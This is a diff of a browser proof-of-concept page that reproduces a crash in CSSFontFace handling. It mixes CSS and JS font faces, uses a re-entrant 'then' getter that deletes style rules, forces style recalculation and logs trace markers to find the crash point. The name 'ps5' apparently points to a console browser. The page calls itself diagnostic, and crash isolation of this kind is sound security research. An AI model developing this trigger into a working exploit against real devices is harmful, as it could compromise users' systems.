@@ -1,10 +1,9 @@
 <!doctype html>
-
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CSSFontFace loaded + then + pre-load recalc isolate</title>
+<title>CSSFontFace crashpoint marker</title>
 <style>
 html {
     font-family: system-ui, -apple-system, sans-serif;
@@ -49,37 +48,47 @@ body {
 </style>
 </head>
 <body>
-<h1>CSSFontFace loaded + then + pre-load recalc isolate</h1>
+
+<h1>CSSFontFace crashpoint marker</h1>
+
 <div class="box warn">
 Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP, no sandbox escape.
 </div>
+
 <div class="box">
     <div id="stage">Stage: not started</div>
     <div id="probe">AB</div>
 </div>
+
 <div class="box">
     <h3>Current log</h3>
     <pre id="log"></pre>
 </div>
+
 <div class="box">
     <h3>Previous persisted log</h3>
     <pre id="previous"></pre>
 </div>
+
 <script>
 (function () {
     "use strict";
-    const STORAGE_KEY = "cssfontface-loaded-then-preload-recalc-isolate-log";
+
+    const STORAGE_KEY = "cssfontface-crashpoint-marker-log";
     const stageElement = document.getElementById("stage");
     const logElement = document.getElementById("log");
     const previousElement = document.getElementById("previous");
     const probe = document.getElementById("probe");
+
     let seq = 0;
     let finished = false;
     let createdFaces = [];
     let active = null;
+
     function now() {
         return new Date().toISOString();
     }
+
     function persist(line) {
         try {
             const old = localStorage.getItem(STORAGE_KEY) || "";
@@ -87,16 +96,19 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         } catch (e) {
         }
     }
+
     function log(msg) {
         const line = "[" + (++seq) + "] " + now() + " :: " + msg;
         logElement.textContent += line + "\n";
         persist(line);
         try { console.log(line); } catch (e) {}
     }
+
     function stage(msg) {
         stageElement.textContent = "Stage: " + msg;
         log("STAGE => " + msg);
     }
+
     function finish() {
         if (finished)
             return;
@@ -104,6 +116,7 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         log("NO CRASH OBSERVED");
         log("DONE");
     }
+
     function loadPrevious() {
         try {
             previousElement.textContent = localStorage.getItem(STORAGE_KEY) || "";
@@ -111,17 +124,21 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             previousElement.textContent = "localStorage unavailable: " + e;
         }
     }
+
     window.onerror = function (message, source, lineno, colno, error) {
         log("window.onerror: " + message + " at " + lineno + ":" + colno);
         if (error && error.stack)
             log("stack: " + error.stack);
     };
+
     window.onunhandledrejection = function (event) {
         log("unhandledrejection: " + event.reason);
     };
+
     window.addEventListener("beforeunload", function () {
         log("beforeunload fired");
     });
+
     function cleanup() {
         try {
             const oldStyles = document.querySelectorAll("style[data-test-style='1']");
@@ -130,6 +147,7 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         } catch (e) {
             log("cleanup styles threw: " + e.name + ": " + e.message);
         }
+
         try {
             if (document.fonts) {
                 for (const face of createdFaces)
@@ -138,11 +156,13 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         } catch (e) {
             log("cleanup fonts threw: " + e.name + ": " + e.message);
         }
+
         createdFaces = [];
+        active = null;
         probe.style.fontFamily = "";
         probe.textContent = "AB";
-        active = null;
     }
+
     function cssRuleCount(styleElement) {
         try {
             if (!styleElement || !styleElement.sheet)
@@ -152,36 +172,45 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             return "throws:" + e.name;
         }
     }
+
     function makeCSSFace(family) {
         const style = document.createElement("style");
         style.setAttribute("data-test-style", "1");
+
         style.textContent =
             '@font-face {\n' +
             '    font-family: "' + family + '";\n' +
             '    src: local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New");\n' +
             '    unicode-range: U+0042;\n' +
             '}\n';
+
         document.head.appendChild(style);
         return style;
     }
+
     function makeJSFace(family) {
         const face = new FontFace(
             family,
             'local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")',
             { unicodeRange: "U+0041" }
         );
+
         createdFaces.push(face);
         return face;
     }
+
     function makeThenGetter(label) {
         return function () {
             log("then getter property read: " + label + ", armed=" + !!(active && active.armed));
+
             if (active && active.armed) {
                 active.reentered = true;
                 active.reentryCount++;
+
                 stage("THEN GETTER FIRED");
                 log("THEN GETTER FIRED from " + label);
-                log("inside getter cssRules=" + cssRuleCount(active.styleElement));
+                log("inside getter cssRules before=" + cssRuleCount(active.styleElement));
+
                 try {
                     const sheet = active.styleElement && active.styleElement.sheet;
                     if (sheet && sheet.cssRules && sheet.cssRules.length > 0) {
@@ -193,87 +222,128 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
                 } catch (e) {
                     log("inside getter deleteRule threw: " + e.name + ": " + e.message);
                 }
-                log("inside getter after deleteRule cssRules=" + cssRuleCount(active.styleElement));
+
+                log("inside getter cssRules after=" + cssRuleCount(active.styleElement));
+
                 try {
                     log("inside getter check A=" + document.fonts.check('16px "' + active.family + '"', "A"));
                     log("inside getter check B=" + document.fonts.check('16px "' + active.family + '"', "B"));
                     log("inside getter check AB=" + document.fonts.check('16px "' + active.family + '"', "AB"));
                 } catch (e) {
-                    log("inside getter document.fonts.check threw: " + e.name + ": " + e.message);
+                    log("inside getter check threw: " + e.name + ": " + e.message);
                 }
             }
+
             return undefined;
         };
     }
-    function checkFonts(label, family) {
-        stage(label + " document.fonts.check A");
+
+    function checkOne(label, family, text) {
+        stage(label + " document.fonts.check " + text + " ENTER");
+        log("MARK: before document.fonts.check " + text);
+
+        let result = null;
         try {
-            log(label + " A=" + document.fonts.check('16px "' + family + '"', "A"));
+            result = document.fonts.check('16px "' + family + '"', text);
+            log(label + " " + text + "=" + result);
         } catch (e) {
-            log(label + " A threw: " + e.name + ": " + e.message);
+            log(label + " " + text + " threw: " + e.name + ": " + e.message);
         }
-        stage(label + " document.fonts.check B");
-        try {
-            log(label + " B=" + document.fonts.check('16px "' + family + '"', "B"));
-        } catch (e) {
-            log(label + " B threw: " + e.name + ": " + e.message);
-        }
-        stage(label + " document.fonts.check AB");
-        try {
-            log(label + " AB=" + document.fonts.check('16px "' + family + '"', "AB"));
-        } catch (e) {
-            log(label + " AB threw: " + e.name + ": " + e.message);
-        }
+
+        log("MARK: after document.fonts.check " + text);
+        stage(label + " document.fonts.check " + text + " EXIT");
+        return result;
     }
+
+    function checkFonts(label, family) {
+        const a = checkOne(label, family, "A");
+        const b = checkOne(label, family, "B");
+        const ab = checkOne(label, family, "AB");
+
+        log("CHECK SUMMARY " + label + ": A=" + a + ", B=" + b + ", AB=" + ab);
+
+        if (a === false && b === true && ab === false)
+            stage("MATCHED ORIGINAL CRASH CHECK STATE A=false B=true AB=false");
+        else
+            stage("CHECK STATE DIFFERENT FROM ORIGINAL");
+
+        return { a: a, b: b, ab: ab };
+    }
+
     function forceStyleRecalc(label) {
-        stage(label + " forceStyleRecalc: body.offsetTop");
+        log("MARK: ENTER forceStyleRecalc " + label);
+
+        stage(label + " forceStyleRecalc body.offsetTop ENTER");
+        log("MARK: before body.offsetTop");
         try {
             log(label + " body.offsetTop=" + document.body.offsetTop);
         } catch (e) {
             log(label + " body.offsetTop threw: " + e.name + ": " + e.message);
         }
-        stage(label + " forceStyleRecalc: probe.offsetWidth");
+        log("MARK: after body.offsetTop");
+        stage(label + " forceStyleRecalc body.offsetTop EXIT");
+
+        stage(label + " forceStyleRecalc probe.offsetWidth ENTER");
+        log("MARK: before probe.offsetWidth");
         try {
             log(label + " probe.offsetWidth=" + probe.offsetWidth);
         } catch (e) {
             log(label + " probe.offsetWidth threw: " + e.name + ": " + e.message);
         }
-        stage(label + " forceStyleRecalc: getComputedStyle");
+        log("MARK: after probe.offsetWidth");
+        stage(label + " forceStyleRecalc probe.offsetWidth EXIT");
+
+        stage(label + " forceStyleRecalc getComputedStyle ENTER");
+        log("MARK: before getComputedStyle(probe).fontFamily");
         try {
             log(label + " fontFamily=" + getComputedStyle(probe).fontFamily);
         } catch (e) {
             log(label + " getComputedStyle threw: " + e.name + ": " + e.message);
         }
+        log("MARK: after getComputedStyle(probe).fontFamily");
+        stage(label + " forceStyleRecalc getComputedStyle EXIT");
+
+        log("MARK: EXIT forceStyleRecalc " + label);
     }
+
     async function run() {
         loadPrevious();
+
         try {
             localStorage.removeItem(STORAGE_KEY);
         } catch (e) {
         }
+
         stage("ready");
-        log("POC STARTED: CSSFontFace loaded + then + pre-load recalc isolate");
+        log("POC STARTED: CSSFontFace crashpoint marker");
+
         cleanup();
+
         if (!window.FontFace) {
             stage("FontFace API missing");
             log("FontFace API unavailable");
             finish();
             return;
         }
+
         if (!document.fonts) {
             stage("document.fonts missing");
             log("document.fonts unavailable");
             finish();
             return;
         }
-        const family = "ps5-loaded-then-preload-recalc-" + Date.now();
+
+        const family = "ps5-crashpoint-" + Date.now();
+
         stage("create CSS @font-face");
         const styleElement = makeCSSFace(family);
         log("family=" + family);
         log("cssRules after CSS face=" + cssRuleCount(styleElement));
+
         stage("create JS FontFace same family");
         const jsFace = makeJSFace(family);
         log("jsFace.status initial=" + jsFace.status);
+
         active = {
             family: family,
             styleElement: styleElement,
@@ -281,6 +351,7 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             reentered: false,
             reentryCount: 0
         };
+
         stage("install own jsFace.then getter");
         try {
             Object.defineProperty(jsFace, "then", {
@@ -293,30 +364,37 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         } catch (e) {
             log("install own getter threw: " + e.name + ": " + e.message);
         }
+
         stage("access jsFace.loaded");
-        let loadedPromise = null;
         try {
-            loadedPromise = jsFace.loaded;
+            const loadedPromise = jsFace.loaded;
             log("accessed jsFace.loaded; face.status=" + jsFace.status);
+
+            loadedPromise.then(function (value) {
+                log("jsFace.loaded resolved callback; valueIsFace=" + (value === jsFace) + ", status=" + jsFace.status);
+            }, function (error) {
+                log("jsFace.loaded rejected callback: " + error + ", status=" + jsFace.status);
+            });
+
+            log("installed jsFace.loaded callbacks");
         } catch (e) {
-            log("access jsFace.loaded threw: " + e.name + ": " + e.message);
+            log("jsFace.loaded setup threw: " + e.name + ": " + e.message);
         }
-        if (loadedPromise) {
-            try {
-                loadedPromise.then(function (value) {
-                    log("jsFace.loaded resolved callback; valueIsFace=" + (value === jsFace) + ", status=" + jsFace.status);
-                }, function (error) {
-                    log("jsFace.loaded rejected callback: " + error + ", status=" + jsFace.status);
-                });
-                log("installed jsFace.loaded callbacks");
-            } catch (e) {
-                log("install loaded callbacks threw: " + e.name + ": " + e.message);
-            }
-        }
+
         stage("assign probe font-family");
         probe.style.fontFamily = '"' + family + '"';
         probe.textContent = "AB";
         log("probe assigned family and text AB");
+
+        /*
+         * Important: match the original crashing ordering:
+         * - access loaded
+         * - install own then getter
+         * - add JS face
+         * - run document.fonts.check A/B/AB
+         * - force style recalc
+         * No document.fonts.load here.
+         */
         stage("add JS face to document.fonts");
         try {
             document.fonts.add(jsFace);
@@ -326,19 +404,31 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             finish();
             return;
         }
-        active.armed = true;
-        log("armed then getter before checks/recalc");
-        checkFonts("before recalc", family);
+
+        /*
+         * Do NOT arm before check in this marker version.
+         * The original crash log showed then getter read with armed=false during add,
+         * then checks A/B/AB before document.fonts.load.
+         */
+        active.armed = false;
+        log("then getter remains disarmed for marker run");
+
+        const beforeState = checkFonts("before recalc", family);
+
+        log("MARK: completed before-recalc checks");
+        log("MARK: beforeState A=" + beforeState.a + ", B=" + beforeState.b + ", AB=" + beforeState.ab);
+
         log("ABOUT TO FORCE STYLE RECALC");
         forceStyleRecalc("preload");
-        active.armed = false;
-        log("disarmed then getter after recalc");
+
         stage("after forceStyleRecalc");
         log("after recalc cssRules=" + cssRuleCount(styleElement));
         log("after recalc jsFace.status=" + jsFace.status);
         log("after recalc document.fonts.size=" + document.fonts.size);
         log("after recalc reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
+
         checkFonts("after recalc", family);
+
         stage("wait for loaded callbacks");
         setTimeout(function () {
             stage("complete after callback wait");
@@ -349,6 +439,7 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             finish();
         }, 1000);
     }
+
     setTimeout(function () {
         run().catch(function (e) {
             log("TOP LEVEL ERROR: " + e.name + ": " + e.message);
@@ -357,5 +448,6 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
     }, 500);
 })();
 </script>
+
 </body>
 </html>
